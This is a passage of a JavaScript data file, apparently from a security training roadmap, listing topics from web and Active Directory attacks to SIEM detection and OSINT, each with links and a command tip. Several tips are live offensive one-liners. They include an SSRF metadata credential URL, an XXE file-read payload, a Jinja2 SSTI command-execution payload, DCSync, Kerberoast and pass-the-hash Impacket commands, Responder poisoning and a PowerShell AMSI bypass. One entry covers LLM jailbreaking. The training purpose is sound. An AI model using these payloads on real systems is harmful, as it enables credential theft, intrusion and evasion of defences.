            { name: "AWS Documentation: IMDSv1 vs IMDSv2 Transition", url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html", type: "spec" },
            { name: "PayloadsAllTheThings: Cloud Metadata Endpoints List", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery", type: "cheatsheet" }
        ],
        commandTip: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
    },
    "idor-access": {
        title: "Insecure Direct Object References (IDOR/BOLA)",
        stage: "STG-03",
        track: "web",
        summary: "Audit access control flaws where applications expose database keys, GUIDs, or usernames without verifying session ownership. Ranked OWASP API #1 (Broken Object Level Authorization).",
        docs: "https://portswigger.net/web-security/access-control/idor",
        cheatsheet: "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html",
        lab: "https://portswigger.net/web-security/access-control",
        resources: [
            { name: "PortSwigger: Access Control Vulnerabilities & IDOR", url: "https://portswigger.net/web-security/access-control/idor", type: "lab" },
            { name: "OWASP IDOR Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html", type: "spec" },
            { name: "OWASP API Security Top 10: API1:2023 BOLA", url: "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/", type: "spec" },
            { name: "Autorize: Burp Suite Extension for Automatic Auth Testing", url: "https://github.com/Quitten/Autorize", type: "tool" }
        ],
        commandTip: "GET /api/v2/invoices/9481 HTTP/1.1  # Change parameter to query other tenant records"
    },
    "xxe-injection": {
        title: "XML External Entity (XXE) File Exfiltration",
        stage: "STG-03",
        track: "web",
        summary: "Exploit insecure XML parsers processing external entity declarations: read local files (/etc/passwd, win.ini), trigger internal SSRF, or exfiltrate data via out-of-band DTDs.",
        docs: "https://portswigger.net/web-security/xxe",
        cheatsheet: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
        lab: "https://portswigger.net/web-security/xxe#labs",
        resources: [
            { name: "PortSwigger Academy: XML External Entity (XXE) Injection", url: "https://portswigger.net/web-security/xxe", type: "lab" },
            { name: "OWASP XXE Prevention Cheat Sheet (All Languages)", url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html", type: "spec" },
            { name: "PayloadsAllTheThings: XXE Injection & Out-of-Band DTDs", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection", type: "cheatsheet" },
            { name: "XXEinjector: Automated XXE Exploitation Tool", url: "https://github.com/enjoiz/XXEinjector", type: "tool" }
        ],
        commandTip: "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><data>&xxe;</data>"
    },
    "jwt-bypass": {
        title: "JWT Signature Stripping & None Algorithm Abuse",
        stage: "STG-03",
        track: "web",
        summary: "Dissect JSON Web Tokens (Header.Payload.Signature): exploit 'none' algorithm bypass, HMAC key-confusion with RSA public keys, weak secret brute forcing, and JWK injection.",
        docs: "https://portswigger.net/web-security/jwt",
        cheatsheet: "https://jwt.io/introduction",
        lab: "https://portswigger.net/web-security/jwt#labs",
        resources: [
            { name: "PortSwigger Academy: JWT Attacks & Bypasses", url: "https://portswigger.net/web-security/jwt", type: "lab" },
            { name: "JWT.io: Interactive Debugger & Specification", url: "https://jwt.io", type: "tool" },
            { name: "jwt_tool: Toolkit for Validating & Exploiting JWTs", url: "https://github.com/ticarpi/jwt_tool", type: "tool" },
            { name: "HackTricks: JSON Web Token Vulnerabilities", url: "https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html", type: "cheatsheet" }
        ],
        commandTip: "python3 jwt_tool.py <TOKEN> -X a  # Test algorithm none bypass against token"
    },
    "ssti-rce": {
        title: "Server-Side Template Injection to Remote Code Exec",
        stage: "STG-03",
        track: "web",
        summary: "Identify template engines (Jinja2, Twig, Freemarker, Pebble): inject syntax into template expressions to access runtime classloaders, execute system commands, and spawn shells.",
        docs: "https://portswigger.net/web-security/server-side-template-injection",
        cheatsheet: "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html",
        lab: "https://portswigger.net/web-security/server-side-template-injection#labs",
        resources: [
            { name: "PortSwigger Academy: Server-Side Template Injection (SSTI)", url: "https://portswigger.net/web-security/server-side-template-injection", type: "lab" },
            { name: "HackTricks: SSTI Methodology & Decision Tree", url: "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html", type: "cheatsheet" },
            { name: "Tplmap: Automatic Server-Side Template Injection and RCE", url: "https://github.com/epinna/tplmap", type: "tool" },
            { name: "PayloadsAllTheThings: Jinja2, Twig, Freemarker Payloads", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection", type: "cheatsheet" }
        ],
        commandTip: "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
    },

    // ------------------------------------------------------------------------
    // STAGE 4: Active Directory & Enterprise Exploitation
    // ------------------------------------------------------------------------
    "ad-kerberoast": {
        title: "Kerberoasting SPN Service Account Hashes",
        stage: "STG-04",
        track: "network",
        summary: "Request TGS Kerberos service tickets for accounts with ServicePrincipalNames (SPNs). Extract the RC4/AES encrypted ticket blob from memory and crack offline using hashcat.",
        docs: "https://attack.mitre.org/techniques/T1558/003/",
        cheatsheet: "https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/",
        lab: "https://www.hackthebox.com",
        resources: [
            { name: "MITRE ATT&CK T1558.003: Kerberoasting", url: "https://attack.mitre.org/techniques/T1558/003/", type: "spec" },
            { name: "WADComs: GetUserSPNs.py Command Reference", url: "https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/", type: "cheatsheet" },
            { name: "HarmJ0y (Will Schroeder): Kerberoasting Without Mimikatz", url: "https://posts.specterops.io", type: "docs" },
            { name: "TryHackMe: Attacktive Directory Room", url: "https://tryhackme.com/room/attacktivedirectory", type: "lab" }
        ],
        commandTip: "impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.1 -request -outputfile hashes.kerb"
    },
    "ad-dcsync": {
        title: "DCSync Replication NTDS.dit Password Extraction",
        stage: "STG-04",
        track: "network",
        summary: "Abuse Directory Replication Services (DRSUAPI) with DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions to impersonate a domain controller and pull KRBTGT hashes.",
        docs: "https://attack.mitre.org/techniques/T1003/006/",
        cheatsheet: "https://wadcoms.github.io/wadcoms/Impacket-secretsdump-DCSync/",
        lab: "https://www.hackthebox.com",
        resources: [
            { name: "MITRE ATT&CK T1003.006: OS Credential Dumping: DCSync", url: "https://attack.mitre.org/techniques/T1003/006/", type: "spec" },
            { name: "WADComs: secretsdump.py DCSync Execution", url: "https://wadcoms.github.io/wadcoms/Impacket-secretsdump-DCSync/", type: "cheatsheet" },
            { name: "SpecterOps: Hunting DCSync in Directory Service Logs", url: "https://posts.specterops.io", type: "docs" },
            { name: "HackTheBox Academy: Active Directory PowerView Path", url: "https://academy.hackthebox.com", type: "lab" }
        ],
        commandTip: "impacket-secretsdump -just-dc-user krbtgt domain.local/admin:'pass'@10.10.10.1"
    },
    "ad-bloodhound": {
        title: "BloodHound Neo4j Shortest Attack Path Graphing",
        stage: "STG-04",
        track: "network",
        summary: "Collect Active Directory object graphs using SharpHound/BloodHound.py. Query graph relationships in Neo4j (WriteDacl, GenericAll, MemberOf, CanRDP) to uncover shortest path to Domain Admin.",
        docs: "https://bloodhound.specterops.io",
        cheatsheet: "https://cheatsheet.haax.fr/windows-systems/active-directory/bloodhound_cypher_queries/",
        lab: "https://www.hackthebox.com",
        resources: [
            { name: "BloodHound Official SpecterOps Documentation", url: "https://bloodhound.specterops.io", type: "docs" },
            { name: "Haax: BloodHound Cypher Queries Cheat Sheet", url: "https://cheatsheet.haax.fr/windows-systems/active-directory/bloodhound_cypher_queries/", type: "cheatsheet" },
            { name: "BloodHound.py: Python Ingestor for Active Directory", url: "https://github.com/dirkjanm/BloodHound.py", type: "tool" },
            { name: "TryHackMe: BloodHound Mastery Room", url: "https://tryhackme.com/room/bloodhound", type: "lab" }
        ],
        commandTip: "bloodhound-python -u user -p pass -ns 10.10.10.1 -d domain.local -c All --zip"
    },
    "ad-asrep": {
        title: "AS-REP Roasting No-Preauth User Accounts",
        stage: "STG-04",
        track: "network",
        summary: "Identify user accounts with 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) flag enabled. Request AS-REP ciphertexts without knowing password and crack offline.",
        docs: "https://attack.mitre.org/techniques/T1558/004/",
        cheatsheet: "https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/",
        lab: "https://tryhackme.com/room/attacktivedirectory",
        resources: [
            { name: "MITRE ATT&CK T1558.004: AS-REP Roasting", url: "https://attack.mitre.org/techniques/T1558/004/", type: "spec" },
            { name: "WADComs: GetNPUsers.py Usage Guide", url: "https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/", type: "cheatsheet" },
            { name: "Impacket Tool Suite Official GitHub", url: "https://github.com/fortra/impacket", type: "tool" },
            { name: "HarmJ0y: Roasting AS-REPs in Enterprise Domains", url: "https://posts.specterops.io", type: "docs" }
        ],
        commandTip: "impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes"
    },
    "ad-adcs": {
        title: "Active Directory Certificate Services (ESC1-ESC8)",
        stage: "STG-04",
        track: "network",
        summary: "Exploit Active Directory Certificate Services misconfigurations: ESC1 (Enrollee supplies SAN), ESC2/ESC3 (Agent EKU), ESC4 (Template ACL), ESC8 (NTLM relay to HTTP cert enrollment).",
        docs: "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        cheatsheet: "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/index.html",
        lab: "https://www.hackthebox.com",
        resources: [
            { name: "SpecterOps Whitepaper: Certified Pre-Owned (ESC1-ESC8)", url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2", type: "spec" },
            { name: "Certipy: Active Directory Certificate Services Tool", url: "https://github.com/ly4k/Certipy", type: "tool" },
            { name: "HackTricks: AD CS Exploitation Playbook", url: "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/index.html", type: "cheatsheet" },
            { name: "Altered Security: Certified Red Team Professional (CRTP)", url: "https://www.alteredsecurity.com/adlab", type: "docs" }
        ],
        commandTip: "certipy req -u user@domain.local -p pass -ca CA-NAME -template ESC1Template -upn administrator@domain.local"
    },
    "ad-pth": {
        title: "Pass-the-Hash & Pass-the-Ticket Lateral Movement",
        stage: "STG-04",
        track: "network",
        summary: "Move laterally without plaintext passwords: Pass-the-Hash (PtH) with NTLM hashes via WMI/SMB/WinRM, and Pass-the-Ticket (PtT) using stolen Kerberos TGT/TGS tickets into session memory.",
        docs: "https://attack.mitre.org/techniques/T1550/002/",
        cheatsheet: "https://wadcoms.github.io/wadcoms/Impacket-wmiexec-PTH/",
        lab: "https://tryhackme.com/room/lateralmovement",
        resources: [
            { name: "MITRE ATT&CK T1550.002: Pass the Hash", url: "https://attack.mitre.org/techniques/T1550/002/", type: "spec" },
            { name: "MITRE ATT&CK T1550.003: Pass the Ticket", url: "https://attack.mitre.org/techniques/T1550/003/", type: "spec" },
            { name: "WADComs: wmiexec.py Pass the Hash", url: "https://wadcoms.github.io/wadcoms/Impacket-wmiexec-PTH/", type: "cheatsheet" },
            { name: "Mimikatz: Sekurlsa & Kerberos Commands Reference", url: "https://github.com/gentilkiwi/mimikatz", type: "tool" }
        ],
        commandTip: "impacket-wmiexec -hashes :aad3b435b51404eeaad3b435b51404ee:fc525c9680e476654f30dc20ce77f226 Administrator@10.10.10.50"
    },
    "ad-responder": {
        title: "LLMNR / NBT-NS Poisoning with Responder",
        stage: "STG-04",
        track: "network",
        summary: "Listen on the local broadcast domain for failed Windows name resolutions (LLMNR, NetBIOS, MDNS). Poison answers to force victims to send NetNTLMv1/NetNTLMv2 authentication hashes.",
        docs: "https://github.com/SpiderLabs/Responder",
        cheatsheet: "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/llmnr-nbt-ns-mDNS-poisoning-and-relay.html",
        lab: "https://tryhackme.com/room/postexploit",
        resources: [
            { name: "Responder Official GitHub (SpiderLabs/Laurent Gaffié)", url: "https://github.com/SpiderLabs/Responder", type: "docs" },
            { name: "HackTricks: LLMNR / NBT-NS Poisoning & Relaying Guide", url: "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/llmnr-nbt-ns-mDNS-poisoning-and-relay.html", type: "cheatsheet" },
            { name: "Hashcat: Cracking NetNTLMv2 (Mode 5600)", url: "https://hashcat.net/wiki/doku.php?id=example_hashes", type: "tool" },
            { name: "Microsoft Guidance: Disabling LLMNR & NBT-NS via GPO", url: "https://learn.microsoft.com", type: "spec" }
        ],
        commandTip: "sudo responder -I eth0 -dwv  # Poison LLMNR/NBT-NS queries and capture NetNTLMv2"
    },

    // ------------------------------------------------------------------------
    // STAGE 5: Threat Hunting & Blue Team Detection
    // ------------------------------------------------------------------------
    "siem-hunting": {
        title: "Splunk & Elastic SIEM Event Correlation",
        stage: "STG-05",
        track: "soc",
        summary: "Query enterprise telemetry in Splunk (SPL) and Elastic (KQL/ES|QL). Correlate Windows Security Event IDs (4624 logon, 4672 elevated privileges, 4720 account created, 5136 AD object modified).",
        docs: "https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/WhatsInThisManual",
        cheatsheet: "https://www.splunk.com/pdfs/solution-guides/splunk-quick-reference-guide.pdf",
        lab: "https://cyberdefenders.org",
        resources: [
            { name: "Splunk Search Reference (SPL Syntax Documentation)", url: "https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/WhatsInThisManual", type: "docs" },
            { name: "Splunk Quick Reference SPL Cheat Sheet (Official PDF)", url: "https://www.splunk.com/pdfs/solution-guides/splunk-quick-reference-guide.pdf", type: "cheatsheet" },
            { name: "Ultimate Windows Security: Windows Event Log Reference", url: "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/", type: "spec" },
            { name: "CyberDefenders: Boss of the SOC (BOTS) Challenges", url: "https://cyberdefenders.org", type: "lab" }
        ],
        commandTip: "index=wineventlog EventCode=4624 Logon_Type=3 NOT (TargetUserName=\"*$*\") | stats count by TargetUserName, Source_Network_Address"
    },
    "sigma-rules": {
        title: "Sigma Generic Detection Rule Authoring",
        stage: "STG-05",
        track: "soc",
        summary: "Write vendor-agnostic detection signatures in YAML. Convert Sigma rules to Splunk SPL, Elastic KQL, QRadar, Sentinel, and Snort using the pySigma compiler pipeline.",
        docs: "https://sigmahq.io",
        cheatsheet: "https://github.com/SigmaHQ/sigma/wiki/Specification",
        lab: "https://letsdefend.io",
        resources: [
            { name: "SigmaHQ Official Project & Community Rule Repository", url: "https://sigmahq.io", type: "docs" },
            { name: "Sigma Rule Specification & Syntax Guide", url: "https://github.com/SigmaHQ/sigma/wiki/Specification", type: "spec" },
            { name: "Sigma Converter (Uncoder.io): Translate Sigma to SPL/KQL", url: "https://uncoder.io", type: "tool" },
            { name: "LetsDefend: SOC Analyst Rule Authoring Course", url: "https://letsdefend.io", type: "lab" }
        ],
        commandTip: "sigma convert -t splunk -p sysmon ./rules/windows/process_creation/proc_creation_win_mimikatz.yml"
    },
    "yara-scans": {
        title: "YARA Rule Memory & Binary Pattern Matching",
        stage: "STG-05",
        track: "malware",
        summary: "Write signature rules for malware classification: string identifiers, hex regex sequences, condition logic, PE file headers, imports (pe.imphash()), and memory scanning.",
        docs: "https://yara.readthedocs.io/en/stable/",
        cheatsheet: "https://raw.githubusercontent.com/InQuest/yara-cheat-sheet/master/yara-cheat-sheet.pdf",
        lab: "https://cyberdefenders.org",
        resources: [
            { name: "YARA Documentation (Victor Alvarez / VirusTotal)", url: "https://yara.readthedocs.io/en/stable/", type: "docs" },
            { name: "InQuest: Comprehensive YARA Syntax Cheat Sheet", url: "https://raw.githubusercontent.com/InQuest/yara-cheat-sheet/master/yara-cheat-sheet.pdf", type: "cheatsheet" },
            { name: "YARA-Rules: Massive Community Rule Repository", url: "https://github.com/Yara-Rules/rules", type: "docs" },
            { name: "TryHackMe: Mastering YARA Rules", url: "https://tryhackme.com/room/yara", type: "lab" }
        ],
        commandTip: "yara -s -r malware_rule.yar /suspicious_directory/"
    },
    "volatility-mem": {
        title: "Volatility 3 Kernel Object & VAD Forensics",
        stage: "STG-05",
        track: "soc",
        summary: "Analyze raw RAM dumps (raw, dmp, vmem) with Volatility 3: inspect process trees (windows.pstree), unlinked rootkit processes (psscan), memory protections (malfind), and network handles (netscan).",
        docs: "https://volatility3.readthedocs.io/en/stable/",
        cheatsheet: "https://cheatsheet.haax.fr/forensics/memory/volatility3/",
        lab: "https://cyberdefenders.org",
        resources: [
            { name: "Volatility 3 Official Documentation & Plugin Architecture", url: "https://volatility3.readthedocs.io/en/stable/", type: "docs" },
            { name: "Haax: Volatility 3 Commands Cheat Sheet", url: "https://cheatsheet.haax.fr/forensics/memory/volatility3/", type: "cheatsheet" },
            { name: "The Volatility Foundation GitHub Repository", url: "https://github.com/volatilityfoundation/volatility3", type: "tool" },
            { name: "CyberDefenders: Memory Forensics (Dumpster Diving) Labs", url: "https://cyberdefenders.org", type: "lab" }
        ],
        commandTip: "python3 vol.py -f memdump.raw windows.malfind.Malfind"
    },
    "zeek-hunting": {
        title: "Zeek Network Threat & DNS Tunneling Analysis",
        stage: "STG-05",
        track: "soc",
        summary: "Parse structured network logs generated by Zeek (conn.log, dns.log, http.log, ssl.log). Calculate subdomain Shannon entropy to detect covert C2 beacons and DNS data exfiltration.",
        docs: "https://docs.zeek.org/en/current/",
        cheatsheet: "https://github.com/corelight/zeek-cheatsheet",
        lab: "https://tryhackme.com/room/zeekbro",
        resources: [
            { name: "Zeek Network Security Monitor Official Documentation", url: "https://docs.zeek.org/en/current/", type: "docs" },
            { name: "Corelight: Official Zeek Log Analysis Cheat Sheet", url: "https://github.com/corelight/zeek-cheatsheet", type: "cheatsheet" },
            { name: "TryHackMe: Zeek In-Depth Network Monitoring Room", url: "https://tryhackme.com/room/zeekbro", type: "lab" },
            { name: "Brim Security / Zui: Interactive Zeek Log Visualizer", url: "https://zui.brimdata.io", type: "tool" }
        ],
        commandTip: "zeek-cut query qtype_name < dns.log | awk '{print length($1), $1}' | sort -nr | head -n 20"
    },
    "sysmon-audit": {
        title: "Sysmon Process Creation & Parent-Child Lineage",
        stage: "STG-05",
        track: "soc",
        summary: "Configure Microsoft Sysmon with SwiftOnSecurity or Olaf Hartong configs. Audit Event ID 1 (Process Create), Event ID 3 (Network Connect), Event ID 7 (Image Load), Event ID 10 (ProcessAccess).",
        docs: "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
        cheatsheet: "https://github.com/SwiftOnSecurity/sysmon-config",
        lab: "https://letsdefend.io",
        resources: [
            { name: "Microsoft Sysinternals: Sysmon Official Documentation", url: "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon", type: "docs" },
            { name: "SwiftOnSecurity: Standard High-Fidelity Sysmon Configuration", url: "https://github.com/SwiftOnSecurity/sysmon-config", type: "cheatsheet" },
            { name: "Olaf Hartong: Modular Sysmon Threat-Hunting Config", url: "https://github.com/olafhartong/sysmon-modular", type: "spec" },
            { name: "TryHackMe: Sysmon Deep Dive", url: "https://tryhackme.com/room/sysmon", type: "lab" }
        ],
        commandTip: "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} | Select -First 10"
    },

    // ------------------------------------------------------------------------
    // STAGE 6: Exploit Dev, Reversing & AI Security
    // ------------------------------------------------------------------------
    "ghidra-re": {
        title: "Ghidra Static Decompilation & P-Code Reversing",
        stage: "STG-06",
        track: "malware",
        summary: "Decompile x86/x64/ARM binaries with NSA Ghidra: analyze control flow graphs, define structs, cross-reference strings, inspect imported DLLs, and trace cryptographic functions.",
        docs: "https://ghidra-sre.org",
        cheatsheet: "https://ghidra-sre.org/CheatSheet.html",
        lab: "https://picoctf.org",
        resources: [
            { name: "NSA Ghidra Software Reverse Engineering Framework", url: "https://ghidra-sre.org", type: "docs" },
            { name: "Ghidra Keyboard Shortcuts & Quick Navigation Cheat Sheet", url: "https://ghidra-sre.org/CheatSheet.html", type: "cheatsheet" },
            { name: "OpenSecurityTraining2: Architecture & Reverse Engineering", url: "https://opensecuritytraining2.org", type: "video" },
            { name: "PicoCTF: Reverse Engineering Practice Challenges", url: "https://picoctf.org", type: "lab" }
        ],
        commandTip: "ghidraHeadless /tmp/project TestProj -import binary.exe -postScript DecompileAll.java"
    },
    "bof-exploit": {
        title: "Stack-Based Buffer Overflow & EIP Control",
        stage: "STG-06",
        track: "malware",
        summary: "Understand the x86 stack frame: ESP, EBP, EIP. Fuzz memory limits, calculate precise offsets with cyclic patterns, identify bad characters, locate JMP ESP pointers, and execute shellcode.",
        docs: "https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/",
        cheatsheet: "https://github.com/corelan/mona",
        lab: "https://exploit.education",
        resources: [
            { name: "Corelan Team: Exploit Writing Tutorial Part 1 (Classic)", url: "https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/", type: "docs" },
            { name: "Mona.py: Immunity Debugger Exploit Development Plugin", url: "https://github.com/corelan/mona", type: "tool" },
            { name: "Exploit Education: Phoenix Stack Exploitation Labs", url: "https://exploit.education", type: "lab" },
            { name: "TryHackMe: Buffer Overflow Prep Room", url: "https://tryhackme.com/room/bufferoverflowprep", type: "lab" }
        ],
        commandTip: "!mona find -s \"\\xff\\xe4\" -m app.exe  # Locate JMP ESP instruction in loaded modules"
    },
    "shellcode-dev": {
        title: "x86_64 Assembly Shellcode Development",
        stage: "STG-06",
        track: "malware",
        summary: "Write position-independent assembly shellcode (NASM): locate kernel32/ntdll in memory via PEB, dynamically resolve GetProcAddress, craft system calls without null bytes (\\x00).",
        docs: "https://www.felixcloutier.com/x86/",
        cheatsheet: "https://defuse.ca/online-x86-assembler.htm",
        lab: "https://shell-storm.org/shellcode/",
        resources: [
            { name: "x86/x64 Instruction Reference (Felix Cloutier)", url: "https://www.felixcloutier.com/x86/", type: "spec" },
            { name: "Shell-Storm: Shellcode Database & Examples Archive", url: "https://shell-storm.org/shellcode/", type: "cheatsheet" },
            { name: "Online x86/x64 Assembler & Disassembler (Defuse)", url: "https://defuse.ca/online-x86-assembler.htm", type: "tool" },
            { name: "Sektor7: Windows Red Team Malware Development Course", url: "https://institute.sektor7.net", type: "video" }
        ],
        commandTip: "nasm -f elf64 shellcode.asm -o shellcode.o && ld shellcode.o -o shellcode"
    },
    "llm-redteam": {
        title: "LLM Prompt Injection, Jailbreaking & PyRIT",
        stage: "STG-06",
        track: "full",
        summary: "Audit Generative AI & Large Language Models against OWASP LLM Top 10: direct prompt injection, indirect context contamination, jailbreak payloads, system prompt leakage, and Microsoft PyRIT automation.",
        docs: "https://owasp.org/www-project-top-10-for-large-language-model-applications",
        cheatsheet: "https://learnprompting.org/docs/category/-defensive-measures",
        lab: "https://gandalf.lakera.ai",
        resources: [
            { name: "OWASP Top 10 for LLM Applications (Official Release)", url: "https://owasp.org/www-project-top-10-for-large-language-model-applications", type: "spec" },
            { name: "Microsoft PyRIT: Python Risk Identification Tool for GenAI", url: "https://github.com/Azure/PyRIT", type: "tool" },
            { name: "Promptfoo: LLM Security, Vulnerability & Guardrail Testing", url: "https://github.com/promptfoo/promptfoo", type: "tool" },
            { name: "Lakera Gandalf: Interactive Prompt Injection Sandbox", url: "https://gandalf.lakera.ai", type: "lab" }
        ],
        commandTip: "promptfoo eval -c promptfooconfig.yaml  # Run automated security scans on LLM prompt outputs"
    },
    "edr-evasion": {
        title: "AMSI Bypass & Process Hollowing Techniques",
        stage: "STG-06",
        track: "network",
        summary: "Bypass modern endpoint detection & response (EDR): in-memory AMSI patching (AmsiScanBuffer), ETW unhooking, unhooking ntdll.dll from disk, process hollowing, and direct syscalls.",
        docs: "https://attack.mitre.org/techniques/T1055/012/",
        cheatsheet: "https://book.hacktricks.wiki/en/windows-hardening/av-edr-evasion/index.html",
        lab: "https://training.zeropointsecurity.co.uk",
        resources: [
            { name: "MITRE ATT&CK T1055.012: Process Hollowing", url: "https://attack.mitre.org/techniques/T1055/012/", type: "spec" },
            { name: "HackTricks: AV & EDR Evasion Techniques", url: "https://book.hacktricks.wiki/en/windows-hardening/av-edr-evasion/index.html", type: "cheatsheet" },
            { name: "SysWhispers3: Direct System Calls for EDR Evasion", url: "https://github.com/klezVirus/SysWhispers3", type: "tool" },
            { name: "Zero-Point Security: Red Team Ops & Evasion Modules", url: "https://training.zeropointsecurity.co.uk", type: "lab" }
        ],
        commandTip: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    },

    // ------------------------------------------------------------------------
    // BONUS OSINT RECON TOPICS (Matched to Track Selector)
    // ------------------------------------------------------------------------
    "osint-social": {
        title: "Social Media & Public Footprint Intelligence",
        stage: "OSINT",
        track: "osint",
        summary: "Investigate target digital footprints across social platforms, archived web caches, username permutations, and public records using Sherlock, WhatsMyName, and Wayback Machine.",
        docs: "https://osintframework.com",
        cheatsheet: "https://github.com/jivoi/awesome-osint",
        lab: "https://www.osintdojo.com",
        resources: [
            { name: "OSINT Framework Interactive Web Tree", url: "https://osintframework.com", type: "docs" },
            { name: "Awesome OSINT Curated Resource List", url: "https://github.com/jivoi/awesome-osint", type: "cheatsheet" },
            { name: "Sherlock: Hunt Down Social Media Accounts by Username", url: "https://github.com/sherlock-project/sherlock", type: "tool" },
            { name: "Internet Archive Wayback Machine", url: "https://archive.org/web/", type: "tool" }
        ],
        commandTip: "sherlock target_username --print-found --timeout 5"
    },
    "osint-shodan": {
        title: "Internet-Connected Device Fingerprinting (Shodan/Censys)",
        stage: "OSINT",
        track: "osint",
        summary: "Discover exposed industrial control systems, open RDP/VNC ports, vulnerable SSL certificates, and compromised IoT devices using Shodan, Censys, and FOFA query filters.",
        docs: "https://help.shodan.io/the-basics/search-query-syntax",
        cheatsheet: "https://github.com/jakejarvis/awesome-shodan-queries",
        lab: "https://www.shodan.io",
        resources: [
            { name: "Shodan Search Query Syntax & Filter Operators", url: "https://help.shodan.io/the-basics/search-query-syntax", type: "spec" },
            { name: "Awesome Shodan Queries Collection (Jake Jarvis)", url: "https://github.com/jakejarvis/awesome-shodan-queries", type: "cheatsheet" },
            { name: "Censys Search: Global Internet Asset Discovery", url: "https://search.censys.io", type: "tool" },
            { name: "Shodan CLI Tool Documentation", url: "https://cli.shodan.io", type: "tool" }
        ],
        commandTip: "shodan search 'port:3389 org:\"Target Organization\" \"authentication: disabled\"'"
    }
};
